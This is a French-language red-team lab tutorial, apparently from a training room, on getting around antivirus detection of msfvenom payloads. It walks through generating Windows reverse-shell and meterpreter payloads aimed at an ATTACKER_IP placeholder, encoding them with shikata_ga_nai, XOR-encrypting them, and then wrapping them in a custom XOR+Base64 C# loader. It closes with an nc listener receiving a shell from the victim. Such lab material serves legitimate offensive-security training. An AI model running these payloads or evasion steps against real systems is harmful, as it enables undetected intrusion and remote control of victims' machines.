## Encoder avec MSFVenom

Les outils publics tels que Metasploit fournissent des fonctionnalités d'encodage et de cryptage. Cependant, les fournisseurs audiovisuels sont conscients de la manière dont ces outils créent leurs charges utiles et prennent des mesures pour les détecter. Si vous essayez d'utiliser de telles fonctionnalités dès le départ, il est probable que votre charge utile soit détectée dès que le fichier touche le disque de la victime.

Générons une charge utile simple avec cette méthode pour prouver ce point.  Tout d'abord, vous pouvez lister tous les encodeurs disponibles pour msfvenom avec la commande suivante :

Liste des encodeurs dans le framework Metasploit

```
user@AttackBox$ msfvenom --list encoders | grep excellent
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

Nous pouvons indiquer que nous voulons utiliser l' `shikata_ga_nai`encodeur avec le `-e`commutateur (encoder), puis spécifier que nous voulons encoder la charge utile trois fois avec le `-i`commutateur (itérations) :

Encodage à l'aide du framework Metasploit (Shikata_ga_nai)

```
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

Si nous essayons de télécharger notre charge utile nouvellement générée sur notre machine de test, l' AV la signalera instantanément avant même que nous ayons la possibilité de l'exécuter :

![747c69e737c96044123329c47845f659](https://github.com/dsgsec/Red-Team/assets/82456829/e84560d5-c0cb-43bf-8b2e-bc3440be8d42)


Si le codage ne fonctionne pas, nous pouvons toujours essayer de chiffrer la charge utile. Intuitivement, nous nous attendrions à ce que cela ait un taux de réussite plus élevé, car le décryptage de la charge utile devrait s'avérer une tâche plus difficile pour l' AV . Essayons ça maintenant.

## Chiffrement à l'aide de MSFVenom

Vous pouvez facilement générer des charges utiles cryptées à l'aide de msfvenom. Les choix en matière d'algorithmes de chiffrement sont cependant un peu rares. Pour lister les algorithmes de chiffrement disponibles, vous pouvez utiliser la commande suivante :

Liste des modules de chiffrement dans Metasploit Framework

```
user@AttackBox$ msfvenom --list encrypt
Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

Créons une charge utile chiffrée XOR. Pour ce type d'algorithme, vous devrez spécifier une clé. La commande ressemblerait à ceci :

Xoring Shellcode à l'aide du framework Metasploit

```
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

Encore une fois, si nous téléchargeons le shell résultant dans THM Antivirus Check ! page à `http://MACHINE_IP/`, il sera toujours signalé par l' AV . La raison est toujours que les fournisseurs d'antivirus ont investi beaucoup de temps pour garantir la détection de simples charges utiles msfvenom.

## Création d'une charge utile personnalisée

La meilleure façon de surmonter ce problème est d'utiliser nos propres schémas de codage personnalisés afin que l' AV ne sache pas quoi faire pour analyser notre charge utile. Notez que vous n'avez rien de trop complexe à faire, à condition que cela soit suffisamment déroutant pour que l'AV puisse l'analyser. Pour cette tâche, nous prendrons un simple shell inversé généré par msfvenom et utiliserons une combinaison de XOR et Base64 pour contourner Defender.

Commençons par générer un reverse shell avec msfvenom au format CSharp :

Générer un format de shellcode CSharp

```
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

## L'encodeur

Avant de créer notre charge utile réelle, nous allons créer un programme qui prendra le shellcode généré par msfvenom et l'encodera comme bon nous semble. Dans ce cas, nous allons d'abord effectuer un XOR sur la charge utile avec une clé personnalisée, puis l'encoder en base64. Voici le code complet de l'encodeur (vous pouvez également trouver ce code sur votre ordinateur Windows à l'adresse C:\Tools\CS Files\Encryptor.cs) :

*Code de charge utile complet (cliquez pour lire)*

Le code est assez simple et générera une charge utile codée que nous intégrerons dans la charge utile finale. N'oubliez pas de remplacer la `buf`variable par le shellcode que vous avez généré avec msfvenom.

Pour compiler et exécuter l'encodeur, nous pouvons utiliser les commandes suivantes sur la machine Windows :

Compilation et exécution de notre encodeur CSharp personnalisé

```
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

## Charge utile à décodage automatique

Puisque nous avons une charge utile codée, nous devons ajuster notre code pour qu'il décode le shellcode avant de l'exécuter. Pour faire correspondre l'encodeur, nous allons tout décoder dans l'ordre inverse dans lequel nous l'avons codé, nous commençons donc par décoder le contenu base64, puis continuons en effectuant un XOR sur le résultat avec la même clé que celle que nous avons utilisée dans l'encodeur. Voici le code complet de la charge utile (vous pouvez également l'obtenir sur votre ordinateur Windows à l'adresse `C:\Tools\CS Files\EncStageless.cs`) :

*Code de charge utile complet (cliquez pour lire)*

Notez que nous avons simplement combiné quelques techniques très simples qui ont été détectées lorsqu'elles étaient utilisées séparément. Pourtant, l' AV ne se plaindra pas de la charge utile cette fois-ci, car la combinaison des deux méthodes n'est pas quelque chose qu'il peut analyser directement.

Compilons notre payload avec la commande suivante sur la machine Windows :

Compilez notre charge utile cryptée

```
C:\> csc.exe EncStageless.cs
```

Avant d'exécuter notre charge utile, configurons un `nc`écouteur. Après avoir copié et exécuté notre charge utile sur la machine victime, nous devrions rétablir une connexion comme prévu :

Configurer l'écouteur nc

```
user@AttackBox$ nc -lvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```

Comme vous pouvez le constater, de simples ajustements suffisent parfois. La plupart du temps, les méthodes spécifiques que vous trouvez en ligne ne fonctionneront probablement pas immédiatement, car des signatures de détection peuvent déjà exister pour elles. Cependant, faire preuve d'un peu d'imagination pour personnaliser n'importe quelle méthode pourrait s'avérer suffisant pour réussir un contournement.
